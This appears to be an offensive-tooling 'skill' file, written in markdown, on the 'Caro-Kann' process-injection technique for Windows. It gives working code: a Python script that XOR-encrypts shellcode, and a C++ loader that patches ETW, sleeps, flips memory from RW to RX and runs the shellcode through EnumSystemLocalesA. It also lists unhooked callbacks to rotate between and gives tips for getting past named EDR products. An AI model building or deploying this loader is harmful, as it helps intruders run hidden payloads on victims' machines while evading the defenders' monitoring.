# caro-kann-injection

> **Status:** COMPLETE
> **Cluster:** 09-odpc
> **Maps to:** Chapter 24 (Process Injection: Caro-Kann Framework)

## Description
The Caro-Kann injection technique: a multi-stage pattern that allocates RW memory,
sleeps to evade heuristic timers, flips to RX, and executes via an unmonitored Windows
callback. Designed to bypass ETW and kernel callback-based detection simultaneously.

Invoke when: implementing a stealthy injector, debugging why a callback-based execution
is being caught, or understanding the sleep-mask + callback combination.

## Why Caro-Kann?

Named after the Caro-Kann chess defence (solid, measured, hard to attack directly).
The technique defeats three distinct detection vectors simultaneously:

1. **Heuristic timers** — many EDRs flag immediate RW→RX transitions followed by execution;
   a `Sleep` between the permission change and execution breaks the timer chain
2. **ETW telemetry** — combined with EtwEventWrite patching (etw-evasion skill),
   the execution path doesn't appear in ETW logs
3. **Callback monitoring** — uses Windows API callbacks that are not monitored by
   common user-land hooks, avoiding `CreateThread` / `RtlCreateUserThread` signatures

## Multi-stage flow

```
Stage 1: Prepare
  ├── Patch ETW (EtwEventWrite → ret)
  ├── Decrypt / extract shellcode
  └── Allocate RW region

Stage 2: Write
  └── Copy decrypted shellcode into RW region

Stage 3: Sleep (masking window)
  ├── [optional] Spoof call stack before sleep
  ├── Sleep(jitter)          ← EDR scans here; no RX memory, patched ETW
  └── [optional] Restore call stack after sleep

Stage 4: Execute
  ├── VirtualProtect: RW → RX
  └── Execute via unmonitored callback
```

## Implementation

### Python shellcode encryptor (pre-build)

```python
#!/usr/bin/env python3
# encrypt.py — XOR-encrypt shellcode before embedding
import sys
import os

def xor_encrypt(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <input.bin> <output.bin> <key_hex>")
        sys.exit(1)
    key = int(sys.argv[3], 16)
    with open(sys.argv[1], "rb") as f:
        data = f.read()
    with open(sys.argv[2], "wb") as f:
        f.write(xor_encrypt(data, key))
    print(f"Encrypted {len(data)} bytes with key 0x{key:02X} -> {sys.argv[2]}")
```

### C++ injector skeleton

```cpp
#include <Windows.h>

#define XOR_KEY  0xAB
#define JITTER_MS 5000

// Forward declarations (implement per your embedding method)
LPVOID GetShellcodePtr(PDWORD pdwLen);

// ETW patch (see etw-evasion skill)
void PatchEtw(void);

// XOR decrypt in-place
void XorDecrypt(LPBYTE p, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++) p[i] ^= key;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    // Stage 1: Patch ETW before any allocation
    PatchEtw();

    // Get shellcode (from resource, heap, wherever)
    DWORD  dwLen   = 0;
    LPVOID pSource = GetShellcodePtr(&dwLen);
    if (!pSource) return 1;

    // Allocate RW (not RX — avoids immediate RX allocation IOC)
    LPVOID pBuf = VirtualAlloc(NULL, dwLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuf) return 1;

    // Stage 2: Copy and decrypt
    CopyMemory(pBuf, pSource, dwLen);
    XorDecrypt((LPBYTE)pBuf, dwLen, XOR_KEY);

    // Stage 3: Sleep — EDR scans during this window
    // At this point: no RX memory, ETW patched, stack should be spoofed
    Sleep(JITTER_MS);

    // Stage 4a: Flip to RX
    DWORD dwOld;
    VirtualProtect(pBuf, dwLen, PAGE_EXECUTE_READ, &dwOld);

    // Stage 4b: Execute via callback (not CreateThread)
    EnumSystemLocalesA((LOCALE_ENUMPROCA)pBuf, 0);

    return 0;
}
```

## Unmonitored callback vectors

These Windows API callbacks invoke a function pointer without going through
`CreateThread`, `RtlCreateUserThread`, or other heavily-monitored entry points.
EDRs do not consistently hook all of them.

| Callback API | Signature | Notes |
|---|---|---|
| `EnumSystemLocalesA` | `LOCALE_ENUMPROCA` (LPSTR → BOOL) | Commonly used; increasingly signatured |
| `EnumUILanguages` | `UILANGUAGE_ENUMPROCA` | Less common than EnumSystemLocales |
| `EnumCalendarInfoA` | `CALINFO_ENUMPROCA` | Rarely seen in shellcode; good choice |
| `EnumTimeFormatsA` | `TIMEFMT_ENUMPROCA` | Niche; good for diversity |
| `SetTimer` (callback) | `TIMERPROC` | Requires message loop; adds complexity |
| `QueueUserAPC` | `PAPCFUNC` | Requires thread in alertable wait |

**Rotate callbacks** across payloads — if `EnumSystemLocales` is signatured, switch to
`EnumCalendarInfo`.

**Callback signature mismatch:** the shellcode stub must return the correct type for
the callback to not crash. For BOOL-returning callbacks, ensure the shellcode ends with
`mov eax, 1 ; ret` (or similar). A stub that just returns 0 will cause the enumerator
to stop after the first call — which is fine for a single invocation.

## Sleep masking integration

For a full sleep mask (not just jitter), combine with call stack spoofing:

```
Before Sleep():
  1. Encrypt in-memory shellcode (optional — defeats memory scanning)
  2. Spoof call stack (call-stack-spoofing skill)

Sleep()

After Sleep():
  1. Restore call stack
  2. Decrypt shellcode
  3. Continue
```

At minimum, the sleep window must have:
- No RX regions in the process (already satisfied — we sleep before VirtualProtect)
- ETW patched
- Call stack pointing to ntdll (with spoofing) or at least not pointing to shellcode

## Project structure recommendation

```
caro-kann/
├── caro-kann.sln
├── loader/                  # C++ Win32 application
│   ├── main.cpp             # WinMain: ETW patch, alloc, sleep, callback
│   ├── etw.cpp / etw.h      # EtwEventWrite patch
│   ├── resource.rc          # Resource file embedding encrypted shellcode
│   └── loader.vcxproj
└── tools/
    └── encrypt.py           # Pre-build shellcode encryptor
```

## Gotchas

- **`EnumSystemLocalesA` is signatured.** CrowdStrike and MDE have rules for shellcode
  invoked via `EnumSystemLocalesA`. Rotate to `EnumCalendarInfoA` or `EnumTimeFormatsA`.
- **`VirtualProtect` itself is hooked.** Use `NtProtectVirtualMemory` syscall for the
  RW→RX flip to avoid the hooked VirtualProtect.
- **Sleep jitter.** Use randomised sleep (`rand() % 3000 + 3000`) rather than a fixed
  value to defeat timing-based heuristics.
- **ETW patch before allocation.** Patch ETW as early as possible — before VirtualAlloc
  and before any assembly loads. Late patches miss early events.
- **RX vs RWX.** Never allocate RWX — it is flagged universally. Always RW then flip to RX.
- **Testing in lab.** Test each stage individually: alloc + sleep (no exec) to check if
  the sleep window is clean, then add exec to isolate the execution trigger.

## Related skills

- `pe-resource-shellcode` — source of the encrypted shellcode blob
- `etw-evasion` — ETW patch that is Stage 1 of this flow
- `call-stack-spoofing` — sleep masking component used in Stage 3
- `syscall-techniques` — use NtProtectVirtualMemory for the Stage 4a permission flip
- `edr-test-loop` — structured test loop to iterate bypass against each lab EDR
- `process-injection-taxonomy` — technique context: where Caro-Kann fits in the injection taxonomy
